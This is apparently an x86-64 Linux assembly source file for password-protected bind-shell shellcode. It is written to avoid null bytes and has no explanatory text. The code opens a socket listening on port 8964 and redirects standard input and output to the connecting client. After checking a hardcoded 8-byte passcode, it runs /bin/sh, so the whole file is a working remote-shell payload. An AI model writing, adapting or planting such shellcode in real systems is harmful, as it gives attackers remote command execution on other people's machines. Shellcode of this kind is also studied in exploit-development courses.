global _start

section .text

_start:

 	; mov rax, 41
	mov al, 41

	; mov rdi, 2
	xor rdi, rdi
	add rdi, 2

	; mov rsi, 1
	xor rsi, rsi
	add rsi, 1
	xor rdx, rdx
	syscall

	mov rdi, rax

	xor rax, rax
	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x423
	mov byte [rsp-8], 0x2
	sub rsp, 8

	; mov rax, 49
	mov al, 49
	mov rsi, rsp

	; mov rdx, 16
	mov dl, 16
	syscall

	; mov rax, 50
	xor rax, rax
	add rax, 50

	; mov rsi, 2
	xor rsi, rsi
	add rsi, 2
	syscall

	; mov rax, 43
	xor rax, rax
	add rax, 43

	sub rsp, 16
	mov rsi, rsp
	mov byte [rsp-1], 16
	sub rsp, 1
	mov rdx, rsp
	syscall

	mov r9, rax

	; mov rax, 3
	xor rax, rax
	add rax, 3
	syscall

	mov rdi, r9

	; mov rax, 33
	xor rax, rax
	add rax, 33

	; mov rsi, 0
	xor rsi, rsi
	syscall

	; mov rax, 33
	xor rax, rax
	add rax, 33

	; mov rsi, 1
	xor rsi, rsi
	add rsi, 1
	syscall

	; mov rax, 33
	xor rax, rax	
	add rax, 33

	; mov rsi, 2
	xor rsi, rsi
	add rsi, 2
	syscall

	jmp promp

passcode:

	; print
	pop rsi

	; mov rax, 1
	xor rax, rax
	add rax, 1
	mov rdi, rax
	mov rdx, rax

	; mov rdx, 10
	add rdx, 9
	syscall

	; read
	xor rax, rax
	mov rdi, rax
	sub rsp, 8
	mov rsi, rsp
	mov dl, 8
	syscall

	mov rax, 0x6b6b6b6b6b6b6b6b
	mov rdi, [rsi]
	xor rax, rdi
	xor rdi, rdi
	cmp rax, rdi

	je shell

	; print
	pop rbx
	xor rbx, rbx
	push rbx

	; mov rax, 1
	; mov rdi, 1
	; mov rdx, 16
	xor rax, rax
	add rax, 1
	mov rdi, rax

	mov rdx, rax
	add rdx, 15
	mov ebx, 0x293a2021
	push rbx
	mov rbx, 0x79725420646f6f47
	push rbx
	mov rsi, rsp
	syscall

	; shutdown
	; mov rax, 48
	xor rax, rax
	add rax, 48
	mov rdi, r9

	; mov rsi, 2
	xor rsi, rsi
	add rsi, 2
	syscall

promp:

	call passcode
	hello: db 'Passcode: '

shell:

	; +===== /bin/sh ======+

	xor rax, rax
	mov rbx, 0x68732f2f6e69622f

	push rax
	push rbx

	mov rdi, rsp

	push rax
	push rdi

	mov rsi, rsp

	add rax, 59
	xor rdx, rdx
	syscall
